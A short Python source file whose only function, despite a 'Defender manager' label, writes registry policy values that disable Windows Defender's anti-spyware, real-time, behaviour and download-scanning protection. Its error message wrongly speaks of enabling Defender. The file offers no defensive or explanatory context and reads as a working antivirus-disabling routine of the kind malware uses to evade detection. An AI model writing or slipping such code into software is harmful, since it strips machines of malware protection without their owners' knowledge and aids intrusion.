
import winreg

WINDOWS_DEFENDER_KEY_PATH = r"SOFTWARE\Policies\Microsoft\Windows Defender"

def disable_defender(error_class):
    try:
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE , WINDOWS_DEFENDER_KEY_PATH) as key:
            winreg.SetValueEx(key , "DisableAntiSpyware" , 0 , winreg.REG_DWORD , 1)
        rt_key_path = WINDOWS_DEFENDER_KEY_PATH + "\\Real-Time Protection"
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, rt_key_path) as rt_key:
            winreg.SetValueEx(rt_key , "DisableRealtimeMonitoring" , 0 , winreg.REG_DWORD , 1)
            winreg.SetValueEx(rt_key , "DisableBehaviorMonitoring" , 0 , winreg.REG_DWORD , 1)
            winreg.SetValueEx(rt_key , "DisableIOAVProtection" , 0 , winreg.REG_DWORD , 1)
    except PermissionError as e:
        raise error_class(f"SHRWindowsDefenderManager [ERROR.4002.0] unable to enable Windows Defender due to PermissionError | {str(e)}")